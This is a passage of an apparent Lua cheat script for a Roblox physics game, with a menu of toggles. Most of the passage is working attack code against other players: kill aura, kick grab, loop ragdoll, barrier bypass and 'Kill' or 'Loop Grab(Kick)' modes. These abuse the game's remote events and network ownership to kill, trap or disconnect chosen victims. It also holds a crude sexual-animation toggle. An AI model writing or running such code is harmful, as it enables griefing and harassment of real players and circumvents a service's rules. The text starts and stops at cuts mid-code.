                if e.Name == "GrabParts" and e:FindFirstChild("GrabPart") then
                    local dragPart = workspace.GrabParts:FindFirstChild("DragPart")
                    if dragPart then
                        local ao = dragPart:FindFirstChild("AlignOrientation")
                        if ao then
                            ao:Destroy()
                        end
                    end
                    local part1 = e.GrabPart:FindFirstChild("WeldConstraint") and e.GrabPart.WeldConstraint.Part1
                    if part1 then
                        while workspace:FindFirstChild("GrabParts") and spingrab and task.wait() do
                            part1.AssemblyAngularVelocity = Vector3.new(0, spinspeed, 0)
                        end
                    end
                end
            end)
        else
            if cons["spingrabConnection"] then
                cons["spingrabConnection"]:Disconnect()
            end
        end
    end
})

box:AddToggle("RagdollGrab", {
    Text = "Ragdoll Grab",
    Default = false,
    Callback = function(v)
        if v then
            local pal, pal2
            pal2 = plr.PlayerGui.MenuGui.Menu.TabContents.ToyDestroy.Contents.ChildAdded:Connect(function(c)
                if c.Name == "PalletLightBrown" then
                    pal = c
                    task.wait()
                    pal2:Disconnect()
                    pal2 = nil
                end
            end)
            local ragd = spawntoy("PalletLightBrown", HRP.CFrame * CFrame.new(5, 5, 20))
            local partt = ragd:WaitForChild("SoundPart", 0.1)
            ragd.Name = "ragdoll"
            spawn(function()
                task.wait(1)
                local ragdoll = pal.ViewItemButton.NewMessage:Clone()
                ragdoll.Name = "Ragdoll"
                ragdoll.TextColor3 = Color3.fromRGB(255, 255, 255)
                ragdoll.Text = "Ragdoll Grab"
                ragdoll.Visible = true
                ragdoll.Parent = pal.ViewItemButton
            end)
            repeat sno(partt) task.wait() until partt:FindFirstChild("PartOwner")
            partt.AssemblyLinearVelocity = Vector3.new(0, 10000, 0)
            spawn(function()
                for i,v in pairs(ragd:GetDescendants()) do
                    if v:IsA("Part") then
                        v.Transparency = 1
                        v.CanCollide = false
                    end
                end
            end)
            cons["rgarab1"] = workspace.ChildAdded:Connect(function(c)
                if c.Name == "GrabParts" then
                    local part = c:FindFirstChild("GrabPart") or c:WaitForChild("GrabPart", 3)
                    if part then
                        local obj = part.WeldConstraint.Part1
                        while workspace:FindFirstChild("GrabParts") and task.wait() do
                            if obj then
                                if obj.Parent and obj.Parent:FindFirstChild("HumanoidRootPart") and obj.Parent:FindFirstChild("Humanoid") and obj.Parent.Humanoid:FindFirstChild("Ragdolled") and obj.Parent.Humanoid.Ragdolled.Value == false then
                                    spawn(function()
                                        partt.AssemblyLinearVelocity = Vector3.new(0, 100, 0)
                                        partt.CFrame = obj.Parent.HumanoidRootPart.CFrame
                                        task.wait(0.05)
                                        partt.CFrame = CFrame.new(0, 1e9, 0)
                                    end)
                                end
                            end
                        end
                    end
                end
            end)
        else
            if cons["rgarab1"] then cons["rgarab1"]:Disconnect() end
            DestroyToy:FireServer(inv.ragdoll)
        end
    end
})

box:AddToggle("KickGrab", {
    Text = "Kick Grab",
    Default = false,
    Callback = function(v)
        if v then
            cons["KickGrab"] = workspace.ChildAdded:Connect(function(c)
                if c.Name ~= "GrabParts" then return end
                local GrabPart = c:WaitForChild("GrabPart", 0.1)
                task.wait(0.1)
                local part = GrabPart.WeldConstraint.Part1
                if game.Players:FindFirstChild(part.Parent.Name) then
                    while GrabPart and GrabPart.Parent do
                        DestroyLine:FireServer(part)
                        RunService.RenderStepped:Wait()
                        SetNetOwner:FireServer(part, part.CFrame)
                        DestroyLine:FireServer(part)
                        RunService.RenderStepped:Wait()
                        SetNetOwner:FireServer(part, part.CFrame)
                        DestroyLine:FireServer(part)
                        RunService.RenderStepped:Wait()
                        SetNetOwner:FireServer(part, part.CFrame)
                        DestroyLine:FireServer(part)
                        RunService.RenderStepped:Wait()
                        SetNetOwner:FireServer(part, part.CFrame)
                    end
                end
            end)
        else
            if cons["KickGrab"] then cons["KickGrab"]:Disconnect() cons["KickGrab"] = nil end
        end
    end
})

box:AddLabel("Auras")
local KillAura, BangAura, FlingAura
box:AddToggle("KillAura", {
    Text = "Kill Aura",
    Default = false,
    Callback = function(v)
        KillAura = v
        if v then
            task.spawn(function()
                while KillAura and RunService.Heartbeat:Wait() do
                    for i,v in Players:GetPlayers() do
                        if v ~= plr then
                            if v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid:GetState() ~= Enum.HumanoidStateType.Dead and (v.Character.HumanoidRootPart.Position - HRP.Position).Magnitude < 30 and not (WhitelistEnabled or not v:IsFriendsWith(plr.UserId)) then
                                sno(v.Character.HumanoidRootPart)
                                v.Character.Humanoid:ChangeState("Dead")
                                DestroyLine:FireServer(v.Character.HumanoidRootPart)
                            end
                        end
                    end
                end
            end)
        end
    end
})

end

do
local box = Tabs.Main:AddRightGroupbox("Settings", "wrench")

box:AddSlider("Strength", {
    Text = "Strength",
    Default = 300,
    Min = 300,
    Max = 40000,
    Rounding = 1,
    Callback = function(v)
        strength = v
    end
})

box:AddSlider("SpinSpeed", {
    Text = "Spin Speed",
    Default = 500,
    Min = 10,
    Max = 1000,
    Rounding = 1,
    Callback = function(v)
        spinspeed = v
    end
})

box:AddSlider("JerkSpeed", {
    Text = "Jerk Interval",
    Default = 0.1,
    Min = 0.01,
    Max = 1,
    Rounding = 11,
    Callback = function(v)
        jerkspeed = v
    end
})

box:AddLabel("Jerk Bind"):AddKeyPicker("JerkBind", {
    Default = "Q",
    NoUI = false,
    Text = "Jerk Bind"
})

end

do
local box = Tabs.Main:AddLeftGroupbox("Misc")

box:AddToggle("WaterWalk", {
    Text = "Water Walk",
    Default = false,
    Callback = function(v)
        for i,vv in pairs(workspace.Map.AlwaysHereTweenedObjects.Ocean.Object.ObjectModel:GetChildren()) do
            if vv.Name == "Ocean" then
                vv.CanCollide = v
            end
        end
    end
})

box:AddToggle("ThirdPerson", {
    Text = "Unlock Third Person",
    Default = false,
    Callback = function(v)
        local thirdp = v
        if v then
			plr.CameraMaxZoomDistance = 100000
			plr.CameraMode = Enum.CameraMode.Classic
            task.spawn(function()
                while thirdp and task.wait(0.1) do
                    local chara = plr.Character
                    if chara then
                        for i,v in pairs(chara:GetChildren()) do
                            if v:IsA("Part") and v.Name ~= "HumanoidRootPart" and v.Name ~= "CamPart" and HasProperty(v, "Transparency") then
                                v.Transparency = 0
                            end
                            if v:IsA("Accessory") and v.Name ~= "TypingKeyboardMyWorld" then
                                if v:FindFirstChildOfClass("Part") then
                                    v:FindFirstChildOfClass("Part").Transparency = 0
                                end
                            end
                        end
                    end
                end
            end)
        else
            plr.CameraMode = Enum.CameraMode.LockFirstPerson
        end
    end
})

box:AddToggle("JerkOff", {
    Text = "Jerk Off",
    Default = false,
    Callback = function(v)
        if v then
            local anim = Instance.new("Animation")
            local JerkFlag = nil
            local timepos = nil

            local screenGui = Instance.new("ScreenGui", plr:WaitForChild("PlayerGui"))
            local jerk = Instance.new("TextLabel", screenGui)
            screenGui.ResetOnSpawn = false

            jerk.Size = UDim2.new(0.1, 0, 0.015, 0)
            jerk.Position = UDim2.new(0.458, 0, 0.477, 0)
            jerk.Text = 'Jerk'
            jerk.TextStrokeColor3 = Color3.new(0, 0, 0)
            jerk.BackgroundTransparency = 1
            jerk.TextScaled = true
            jerk.TextColor3 = Color3.new(255, 255, 255)
            jerk.TextStrokeTransparency = 0
            jerk.Visible = false

            local R6 = "rbxassetid://168268306"
            local R15 = "rbxassetid://698251653"

            cons["JerkTool"] = UserInputService.InputBegan:Connect(function(input, g)
                if g then return end
                if input.KeyCode == Enum.KeyCode[Options.JerkBind.Value] then
                    JerkFlag = not(JerkFlag)
                    jerk.Visible = JerkFlag
                    if not(JerkFlag) then jerkoff:Stop(); return end
                    animator = plr.Character:WaitForChild('Humanoid'):WaitForChild("Animator")
                    if plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then anim.AnimationId = R6 else anim.AnimationId = R15 end
                    if anim.AnimationId == R6 then timepos = 0.3 else timepos = 0.55 end
                    jerkoff = animator:LoadAnimation(anim)
                    jerkoff:Play()
                    while task.wait(jerkspeed) and JerkFlag do jerkoff.TimePosition = timepos end
                end
            end)
        else
            if cons["JerkTool"] then cons["JerkTool"]:Disconnect() end
            if jerkoff then jerkoff:Stop() end
            pcall(function()
                plr.PlayerGui:FindFirstChild("ScreenGui"):Destroy()
            end)
        end
    end
})

box:AddLabel("Add To Target List"):AddKeyPicker("AddToTargetList", {
    Default = "LeftAlt",
    NoUI = false,
    Text = "Add To Target List",
    Callback = function()
        local tar = Mouse.Target
        if tar and tar.Parent and game.Players:FindFirstChild(tar.Parent.Name) then
            local pl = game.Players[tar.Parent.Name]
            BlobmanTarget:SetValue(pl.DisplayName.." ("..pl.Name..")")
            GrabTarget:SetValue(pl.DisplayName.." ("..pl.Name..")")
            Library:Notify("New Target! "..pl.DisplayName.." ("..pl.Name..")", 4)
        end
    end
})

box:AddButton("Break Barrier", function()
    local pos = HRP.CFrame
    local t = tick()
    local burg = inv:FindFirstChild("FoodHamburger") or spawntoy("FoodHamburger", HRP.CFrame * CFrame.new(5,5,20))
    task.wait(0.1)
    grab(burg)
    HRP.CFrame = workspace.Waypoints.TudorHouse.CFrame
    task.wait(0.05)
    DestroyToy:FireServer(burg)
    HRP.CFrame = pos
end)

box:AddButton("Bring Train\n(You can use vfly in IY)", function()
    local pos = HRP.CFrame
    local burger = spawntoy("FoodHamburger", HRP.CFrame)
    repeat task.wait() until burger and burger:FindFirstChild("HoldPart")
    workspace.Map.AlwaysHereTweenedObjects.Train.Object.ObjectModel.Seat:Sit(hum)
    workspace.Map.AlwaysHereTweenedObjects.Train.Object.FollowThisPart.AlignPosition.Enabled = false
    workspace.Map.AlwaysHereTweenedObjects.Train.Object.FollowThisPart.AlignOrientation.Enabled = false
    task.wait(0.1)
    grab(burger)
    task.wait(0.1)
    DestroyToy:FireServer(inv.FoodHamburger)
    HRP.CFrame = pos * CFrame.new(0,5,0)
end)

box:AddButton("Ragdoll", function()
    Ragdoll:FireServer(HRP, 1)
end)


box:AddToggle("LoopRagdoll", {
    Text = "Loop Ragdoll",
    Default = false,
    Callback = function(v)
        loopragdoll = v
        if v then 
            task.spawn(function()
                while loopragdoll and task.wait(0.05) do
                    Ragdoll:FireServer(HRP, 0.5)
                end
            end)
        end
    end
})

box:AddToggle("AntiBarrier", {
    Text = "Anti Barrier",
    Default = false,
    Callback = function(val)
        for i,v in pairs(workspace.Plots:GetChildren()) do
            if v:FindFirstChild("Barrier") then
                for i,v in pairs(v.Barrier:GetChildren()) do
                    if v:IsA("Part") then
                        v.CanCollide = not val
                    end
                end
            end
        end
    end
})

box:AddToggle("KickNotify", {
    Text = "Kick Notify",
    Default = false,
    Callback = function(v)
        if v then
            cons["kicknotify"] = game.Players.PlayerRemoving:Connect(function(plrr)
                if workspace:FindFirstChild("BlackHoleKick") then
                    Library:Notify({
                        Title = "Posral",
                        Description = plrr.Name.."("..plrr.DisplayName..")".." Got Kicked",
                        Time = 4,
                    })
                    workspace:FindFirstChild("BlackHoleKick").Name = plrr.Name.."KICK"
                end
            end)
        else
            if cons["kicknotify"] then cons["kicknotify"]:Disconnect() cons["kicknotify"] = nil end
        end
    end
})

end

do
local box = Tabs.Main:AddRightGroupbox("Teleport")

box:AddLabel("TP To Mouse"):AddKeyPicker("TPTOMOUSE", {
    Default = "T",
    Text = "TP To Mouse",
    Callback = function()
        if Mouse.Target then
            HRP.CFrame = Mouse.Hit * CFrame.new(0, 5, 0)
            stvel(HRP)
        end
    end
})

end

do
local box = Tabs.Target:AddRightGroupbox("Blobman")

local Sets = {
    Name = nil,
    Char = nil,
    HRP = nil,
    Method = nil
}

BlobmanTarget = box:AddDropdown("Target", {
    Text = "Target",
    Values = {"None"},
    Default = 1,
    Multi = false,
    Callback = function(v)
        Sets.Name = getname(v)
    end
})

box:AddDropdown("Method", {
    Text = "Method",
    Values = {"Lock Target1", "Lock Target2", "Super Lock", "Kill"},
    Default = 0,
    Multi = false,
    Callback = function(v)
        Sets.Method = v
    end
})

box:AddButton("Apply Method", function()
    local tt = Sets.Name and Players:FindFirstChild(Sets.Name)
    if not tt then return end
    local Method = Sets.Method
    local Blob = hum and hum.SeatPart and hum.SeatPart.Parent
    if not Blob or Blob.Name ~= "CreatureBlobman" then return end
    if tt and tt.Character and tt.Character:FindFirstChild("HumanoidRootPart") then
        Sets.Char = tt.Character
        Sets.HRP = tt.Character.HumanoidRootPart
        if Method == "Lock Target1" then
            if Blob and Blob.Name == "CreatureBlobman" then
                local CR, CD, CG = Blob.BlobmanSeatAndOwnerScript.CreatureRelease, Blob.BlobmanSeatAndOwnerScript.CreatureDrop, Blob.BlobmanSeatAndOwnerScript.CreatureGrab
                if (Sets.HRP.Position - HRP.Position).Magnitude > 30 then
                    local pos = HRP.CFrame
                    HRP.CFrame = Sets.HRP.CFrame
                    repeat task.wait()
                        CG:FireServer(Blob.RightDetector, Sets.HRP, Blob.RightDetector.RightWeld)
                        CR:FireServer(Blob.RightDetector.RightWeld)
                    until isnetworkowner(Sets.HRP)
                    HRP.CFrame = pos
                    task.wait()
                    if isnetworkowner(Sets.HRP) then
                        Sets.HRP.CFrame = Blob.RightDetector.CFrame
                    end
                end
                CG:FireServer(Blob.RightDetector, Sets.HRP, Blob.RightDetector.RightWeld)
                CD:FireServer(Blob.RightDetector.RightWeld)
                CG:FireServer(Blob.RightDetector, Sets.HRP, Blob.RightDetector.RightWeld)
            end
        elseif Method == "Lock Target2" then
            if Blob and Blob.Name == "CreatureBlobman" then
                local CR, CD, CG = Blob.BlobmanSeatAndOwnerScript.CreatureRelease, Blob.BlobmanSeatAndOwnerScript.CreatureDrop, Blob.BlobmanSeatAndOwnerScript.CreatureGrab
                if (Sets.HRP.Position - HRP.Position).Magnitude > 30 then
                    local pos = HRP.CFrame
                    HRP.CFrame = Sets.HRP.CFrame
                    repeat task.wait() 
                        CG:FireServer(Blob.RightDetector, Sets.HRP, Blob.RightDetector.RightWeld)
                        CR:FireServer(Blob.RightDetector.RightWeld)
                    until isnetworkowner(Sets.HRP)
                    HRP.CFrame = pos
                    task.wait()
                    if isnetworkowner(Sets.HRP) then
                        Sets.HRP.CFrame = Blob.RightDetector.CFrame
                    end
                end
                CG:FireServer(Blob.RightDetector, Sets.HRP, Blob.RightDetector.RightWeld)
                CD:FireServer(Blob.RightDetector.RightWeld)
            end
        elseif Method == "Super Lock" then
            if Blob and Blob.Name == "CreatureBlobman" then
                local CR, CD, CG = Blob.BlobmanSeatAndOwnerScript.CreatureRelease, Blob.BlobmanSeatAndOwnerScript.CreatureDrop, Blob.BlobmanSeatAndOwnerScript.CreatureGrab
                if (Sets.HRP.Position - HRP.Position).Magnitude > 30 then
                    local pos = HRP.CFrame
                    HRP.CFrame = Sets.HRP.CFrame
                    repeat task.wait() 
                        CG:FireServer(Blob.RightDetector, Sets.HRP, Blob.RightDetector.RightWeld)
                        CR:FireServer(Blob.RightDetector.RightWeld)
                    until isnetworkowner(Sets.HRP)
                    HRP.CFrame = pos
                end
                CG:FireServer(Blob.RightDetector, Sets.HRP, Blob.RightDetector.RightWeld)
                CR:FireServer(Blob.RightDetector.RightWeld)
                tt.Character.Humanoid:ChangeState("Seated")
                if isnetworkowner(Sets.HRP) then
                    Sets.HRP.CFrame = Blob.RightDetector.CFrame
                    task.spawn(function()
                        for i,v in pairs(Sets.Char:GetChildren()) do
                            if v:IsA("Part") and v.Name ~= "Humanoid" then
                                v.CanCollide = false
                            end
                        end
                    end)
                end
            end
        elseif Method == "Kill" then
            if Blob and Blob.Name == "CreatureBlobman" then
                local CD,CG = Blob.BlobmanSeatAndOwnerScript.CreatureRelease, Blob.BlobmanSeatAndOwnerScript.CreatureGrab
                local pos = HRP.CFrame
                if tt.Character and tt.Character:FindFirstChild("HumanoidRootPart") and tt.Character.Humanoid.Health ~= 0 then
                    Blob.HumanoidRootPart.CFrame = tt.Character.HumanoidRootPart.CFrame
                    task.wait(0.1)
                    repeat task.wait()
                        CG:FireServer(nil, tt.Character.HumanoidRootPart, Blob.RightDetector.RightWeld)
                        CD:FireServer(Blob.RightDetector.RightWeld)
                    until isnetworkowner(tt.Character.HumanoidRootPart)
                    task.wait()
                    tt.Character.Humanoid:ChangeState("Dead")
                    stvel(HRP)
                    stvel(Blob.HumanoidRootPart)
                    Blob.HumanoidRootPart.CFrame = pos
                end
            end
        end
    end
end)

box:AddToggle("ApplyMethodBlob", {
    Text = "Loop Apply Method",
    Default = false,
    Callback = function(v)
        applymethod = v
        local tt = Sets.Name and Players:FindFirstChild(Sets.Name)
        if not tt then return end
        if v then
            task.spawn(function()
                while applymethod and task.wait(Options.BlobDelay.Value) do
                    tt = Players:FindFirstChild(Sets.Name)
                    local Method = Sets.Method
                    local Blob = hum and hum.SeatPart and hum.SeatPart.Parent
                    if tt and tt.Character and tt.Character:FindFirstChild("HumanoidRootPart") then
                        Sets.Char = tt.Character
                        Sets.HRP = tt.Character.HumanoidRootPart
                        if Method == "Lock Target1" then
                            if Blob and Blob.Name == "CreatureBlobman" then
                                local CR, CD, CG = Blob.BlobmanSeatAndOwnerScript.CreatureRelease, Blob.BlobmanSeatAndOwnerScript.CreatureDrop, Blob.BlobmanSeatAndOwnerScript.CreatureGrab
                                if (Sets.HRP.Position - HRP.Position).Magnitude > 30 then
                                    local pos = HRP.CFrame
                                    HRP.CFrame = Sets.HRP.CFrame
                                    repeat task.wait() 
                                        CG:FireServer(Blob.RightDetector, Sets.HRP, Blob.RightDetector.RightWeld)
                                        CR:FireServer(Blob.RightDetector.RightWeld)
                                    until isnetworkowner(Sets.HRP)
                                    HRP.CFrame = pos
                                    task.wait()
                                    if isnetworkowner(Sets.HRP) then
                                        Sets.HRP.CFrame = Blob.RightDetector.CFrame
                                    end
                                end
                                CG:FireServer(Blob.RightDetector, Sets.HRP, Blob.RightDetector.RightWeld)
                                CD:FireServer(Blob.RightDetector.RightWeld)
                                CG:FireServer(Blob.RightDetector, Sets.HRP, Blob.RightDetector.RightWeld)
                            end
                        elseif Method == "Lock Target2" then
                            if Blob and Blob.Name == "CreatureBlobman" then
                                local CR, CD, CG = Blob.BlobmanSeatAndOwnerScript.CreatureRelease, Blob.BlobmanSeatAndOwnerScript.CreatureDrop, Blob.BlobmanSeatAndOwnerScript.CreatureGrab
                                if (Sets.HRP.Position - HRP.Position).Magnitude > 30 then
                                    local pos = HRP.CFrame
                                    HRP.CFrame = Sets.HRP.CFrame
                                    repeat task.wait() 
                                        CG:FireServer(Blob.RightDetector, Sets.HRP, Blob.RightDetector.RightWeld)
                                        CR:FireServer(Blob.RightDetector.RightWeld)
                                    until isnetworkowner(Sets.HRP)
                                    HRP.CFrame = pos
                                    task.wait()
                                    if isnetworkowner(Sets.HRP) then
                                        Sets.HRP.CFrame = Blob.RightDetector.CFrame
                                    end
                                end
                                CG:FireServer(Blob.RightDetector, Sets.HRP, Blob.RightDetector.RightWeld)
                                CD:FireServer(Blob.RightDetector.RightWeld)
                            end
                        elseif Method == "Super Lock" then
                            if Blob and Blob.Name == "CreatureBlobman" then
                                local CR, CD, CG = Blob.BlobmanSeatAndOwnerScript.CreatureRelease, Blob.BlobmanSeatAndOwnerScript.CreatureDrop, Blob.BlobmanSeatAndOwnerScript.CreatureGrab
                                if (Sets.HRP.Position - HRP.Position).Magnitude > 30 then
                                    local pos = HRP.CFrame
                                    HRP.CFrame = Sets.HRP.CFrame
                                    repeat task.wait() 
                                        CG:FireServer(Blob.RightDetector, Sets.HRP, Blob.RightDetector.RightWeld)
                                        CR:FireServer(Blob.RightDetector.RightWeld)
                                    until isnetworkowner(Sets.HRP)
                                    HRP.CFrame = pos
                                end
                                CG:FireServer(Blob.RightDetector, Sets.HRP, Blob.RightDetector.RightWeld)
                                CR:FireServer(Blob.RightDetector.RightWeld)
                                tt.Character.Humanoid:ChangeState("Seated")
                                if isnetworkowner(Sets.HRP) then
                                    Sets.HRP.CFrame = Blob.RightDetector.CFrame
                                    task.spawn(function()
                                        for i,v in pairs(Sets.Char:GetChildren()) do
                                            if v:IsA("Part") and v.Name ~= "Humanoid" then
                                                v.CanCollide = false
                                            end
                                        end
                                    end)
                                end
                            end
                        elseif Method == "Kill" then
                            if Blob and Blob.Name == "CreatureBlobman" then
                                local CD,CG = Blob.BlobmanSeatAndOwnerScript.CreatureRelease, Blob.BlobmanSeatAndOwnerScript.CreatureGrab
                                local pos = HRP.CFrame
                                if tt.Character and tt.Character:FindFirstChild("HumanoidRootPart") and tt.Character.Humanoid.Health ~= 0 then
                                    Blob.HumanoidRootPart.CFrame = tt.Character.HumanoidRootPart.CFrame
                                    task.wait(0.1)
                                    repeat task.wait()
                                        CG:FireServer(nil, tt.Character.HumanoidRootPart, Blob.RightDetector.RightWeld)
                                        CD:FireServer(Blob.RightDetector.RightWeld)
                                    until isnetworkowner(tt.Character.HumanoidRootPart)
                                    task.wait()
                                    tt.Character.Humanoid:ChangeState("Dead")
                                    stvel(HRP)
                                    stvel(Blob.HumanoidRootPart)
                                    Blob.HumanoidRootPart.CFrame = pos
                                end
                            end
                        end
                    end
                end
            end)
        end
    end
})

end

do
local box = Tabs.Target:AddLeftGroupbox("No Blobman")

local Sets = {
    Name = nil,
    Char = nil,
    HRP = nil,
    Method = nil
}

GrabTarget = box:AddDropdown("Target", {
    Text = "Target",
    Values = {"None"},
    Default = 1,
    Multi = false,
    Callback = function(v)
        Sets.Name = getname(v)
    end
})

box:AddDropdown("Method", {
    Text = "Method",
    Values = {"Loop Grab(Kick)", "Loop Grab", "Kill"},
    Default = 0,
    Multi = false,
    Callback = function(v)
        Sets.Method = v
    end
})

box:AddToggle("ApplyMethodGrab", {
    Text = "Apply Method",
    Default = false,
    Callback = function(v)
        applymethod = v
        local tt = Sets.Name and Players:FindFirstChild(Sets.Name)
        local kickbp, kickbg
        if not tt then return end
        if v then
            task.spawn(function()
                while applymethod and RunService.RenderStepped:Wait() do
                    local pos = HRP.CFrame
                    tt = Players:FindFirstChild(Sets.Name)
                    local Method = Sets.Method
                    if not Method then return end
                    if tt and tt.Character and tt.Character:FindFirstChild("HumanoidRootPart") and HRP then
                        Sets.Char = tt.Character
                        Sets.HRP = tt.Character.HumanoidRootPart
                        if Method == "Loop Grab(Kick)" then
                            if Sets.Char.Parent ~= workspace then
                                local pos = HRP.CFrame
                                local blob = gblob() or inv:FindFirstChild("CreatureBlobman") or spawntoy("CreatureBlobman", HRP.CFrame * CFrame.new(5, 5, 20))
                                repeat task.wait() until blob and blob:FindFirstChild("RightDetector") and blob:FindFirstChild("VehicleSeat")
                                blob.Name = "cringe"
                                if blob then
                                    repeat task.wait() blob.VehicleSeat:Sit(hum) until hum.SeatPart == blob.VehicleSeat 
                                    local CG,CD = blob.BlobmanSeatAndOwnerScript.CreatureGrab, blob.BlobmanSeatAndOwnerScript.CreatureRelease
                                    blob.HumanoidRootPart.CFrame = Sets.HRP.CFrame
                                    task.wait(0.2)
                                    repeat
                                        task.wait()
                                        CG:FireServer(blob.RightDetector, Sets.HRP, blob.RightDetector.RightWeld)
                                        CD:FireServer(blob.RightDetector.RightWeld)
                                    until isnetworkowner(Sets.HRP)
                                    task.wait(0.2)
                                    Sets.HRP.CFrame = pos * offset
                                    HRP.CFrame = pos
                                    DestroyToy:FireServer(inv:FindFirstChild("cringe"))
                                    task.wait(0.5)
                                end
                            end
                            if Sets.HRP and hum and HRP then
                                DestroyLine:FireServer(Sets.HRP)
                                RunService.RenderStepped:Wait()
                                SetNetOwner:FireServer(Sets.HRP, Sets.HRP.CFrame)
                                DestroyLine:FireServer(Sets.HRP)
                                RunService.RenderStepped:Wait()
                                SetNetOwner:FireServer(Sets.HRP, Sets.HRP.CFrame)
                                DestroyLine:FireServer(Sets.HRP)
                                RunService.RenderStepped:Wait()
                                SetNetOwner:FireServer(Sets.HRP, Sets.HRP.CFrame)
                                DestroyLine:FireServer(Sets.HRP)
                                RunService.RenderStepped:Wait()
                                SetNetOwner:FireServer(Sets.HRP, Sets.HRP.CFrame)
                                if (Sets.HRP.Position - HRP.Position).Magnitude >= 29 and Sets.Char.Parent == workspace then
                                    task.wait(0.1)
                                    tp(HRP, Sets.HRP)
                                    task.wait(0.2)
                                    sno(Sets.HRP)
                                    task.wait()
                                    HRP.CFrame = pos
                                    task.wait(0.2)
                                    for i,v in pairs(Sets.Char:GetChildren()) do
                                        if v:IsA("Part") and v.Name ~= "Humanoid" then
                                            v.CFrame = pos * offset
                                        end
                                    end
                                end
                                if Sets.HRP.Position.Y < HRP.Position.Y + 4 and Sets.Char.Parent == workspace then
                                    repeat task.wait() sno(Sets.HRP) until Sets.Char.Head:FindFirstChild("PartOwner")
                                    HRP.CFrame = pos
                                    Sets.HRP.CFrame = HRP.CFrame * offset
                                end
                                task.spawn(function()
                                    if Toggles.EnableRagdoll.Value and PalletForRagdoll and inv:FindFirstChild("PalletForRagdoll") then
                                        PalletForRagdoll.SoundPart.AssemblyLinearVelocity = Vector3.new(0, 1000, 0)
                                        PalletForRagdoll.SoundPart.CFrame = Sets.HRP.CFrame
                                        task.wait(0.05)
                                        PalletForRagdoll.SoundPart.CFrame = HRP.CFrame * CFrame.new(0, 1000, 0)
                                    end
                                end)
                                if not kickbp or kickbp.Parent ~= Sets.HRP then
                                    kickbp = Instance.new("BodyPosition")
                                    kickbp.Parent = Sets.HRP
                                    kickbp.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                    kickbp.D = 200
                                    kickbp.Position = HRP.Position + Vector3.new(0,5,0)
                                end
                                if not kickbg or kickbg.Parent ~= Sets.HRP then
                                    kickbg = Instance.new("BodyGyro")
                                    kickbg.Parent = Sets.HRP
                                    kickbg.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
                                    kickbp.D = 100
                                    kickbg.CFrame = CFrame.new(0, 0, 0)
                                end
                                task.spawn(function()
                                    for i,v in Sets.Char:GetChildren() do
                                        if HasProperty(v, "AssemblyLinearVelocity") then
                                            stvel(v)
                                            v.Velocity = Vector3.zero
                                        end
                                    end
                                end)
                                kickbp.Position = HRP.Position + Vector3.new(offset.X,offset.Y,offset.Z)
                            end
                        elseif Method == "Loop Grab" then
                            if Sets.HRP and hum and HRP and Sets.Char.Parent == workspace then
                                if (Sets.HRP.Position - HRP.Position).Magnitude > 30 then
                                    stvel(HRP)
                                    HRP.CFrame = Sets.HRP.CFrame * CFrame.new(0,0,5)
                                    task.wait()
                                    repeat task.wait() sno(Sets.HRP) until Sets.Char.Head:FindFirstChild("PartOwner")
                                    HRP.CFrame = pos
                                    Sets.HRP.CFrame = HRP.CFrame * CFrame.new(0,15,0)
                                end
                                task.spawn(function()
                                    if Toggles.EnableRagdoll.Value and PalletForRagdoll and inv:FindFirstChild("PalletForRagdoll") then
                                        PalletForRagdoll.SoundPart.AssemblyLinearVelocity = Vector3.new(0, 1000, 0)
                                        PalletForRagdoll.SoundPart.CFrame = Sets.HRP.CFrame
                                        task.wait(0.05)
                                        PalletForRagdoll.SoundPart.CFrame = HRP.CFrame * CFrame.new(0, 1000, 0)
                                    end
                                end)
                                if Sets.Char.Head:FindFirstChild("PartOwner") then
                                    Sets.HRP.CFrame = HRP.CFrame * offset
                                end
                                sno(Sets.HRP)
                            end
                        elseif Method == "Kill" then
                            if Sets.Char.Parent ~= workspace then
                                local pos = HRP.CFrame
                                local blob = gblob() or inv:FindFirstChild("CreatureBlobman") or spawntoy("CreatureBlobman", HRP.CFrame * CFrame.new(5, 5, 20))
                                repeat task.wait() until blob and blob:FindFirstChild("RightDetector") and blob:FindFirstChild("VehicleSeat")
                                blob.Name = "cringe"
                                if blob then
                                    repeat task.wait() blob.VehicleSeat:Sit(hum) until hum.SeatPart == blob.VehicleSeat 
                                    local CG,CD = blob.BlobmanSeatAndOwnerScript.CreatureGrab, blob.BlobmanSeatAndOwnerScript.CreatureRelease
                                    blob.HumanoidRootPart.CFrame = Sets.HRP.CFrame
                                    task.wait(0.2)
                                    repeat
                                        task.wait()
                                        CG:FireServer(blob.RightDetector, Sets.HRP, blob.RightDetector.RightWeld)
                                        CD:FireServer(blob.RightDetector.RightWeld)
                                    until isnetworkowner(Sets.HRP)
                                    task.wait(0.2)
                                    Sets.HRP.CFrame = pos * offset
                                    HRP.CFrame = pos
                                    DestroyToy:FireServer(inv:FindFirstChild("cringe"))
                                    task.wait(0.5)
                                end
                            end
                            if Sets.HRP and hum and HRP and Sets.Char.Parent == workspace and Sets.Char.Humanoid.Health ~= 0 and Sets.Char.Torso:FindFirstChild("Neck") then
                                local pos = HRP.CFrame
                                HRP.CFrame = Sets.HRP.CFrame
                                repeat task.wait()
                                    sno(Sets.HRP)
                                until Sets.Char.Head:FindFirstChild("PartOwner") and isnetworkowner(Sets.HRP)
                                Sets.Char.Humanoid:ChangeState("Dead")
                                DestroyLine:FireServer(Sets.HRP)
                                HRP.CFrame = pos
                            end
                        elseif Method ~= "Loop Grab(Kick)" then
                            if Sets.HRP:FindFirstChild("BodyPosition") then Sets.HRP.BodyPosition:Destroy() end
                        end
                    end
                end
            end)
        else
            repeat task.wait() if Sets.HRP:FindFirstChild("BodyPosition") then Sets.HRP.BodyPosition:Destroy() end until not Sets.HRP:FindFirstChild("BodyPosition")
        end
    end
})

box:AddButton("Try to Remove Gucci", function()
    local pos = HRP.CFrame
    local Seat = Seats[Sets.Name]
    if Seat and hum then
        Seat:Sit(hum)
        task.wait(0.3)
        stvel(HRP)
        HRP.CFrame = pos
    end
end)


end

do
local box = Tabs.Target:AddLeftGroupbox("Settings", "wrench")
box:AddLabel("Change Offset\n(Only for loop grabs)", false)
local x,y,z
box:AddSlider("Offset", {
    Text = "X",
    Default = 0,
    Min = -20,
    Max = 20,
    Rounding = 1,
    Callback = function(v)
        x = v
        offset = CFrame.new(v or 0, y or 0, z or 0)
    end
})
box:AddSlider("Offset", {
    Text = "Y",
    Default = 15,
    Min = -20,
    Max = 20,
    Rounding = 1,
    Callback = function(v)
        y = v
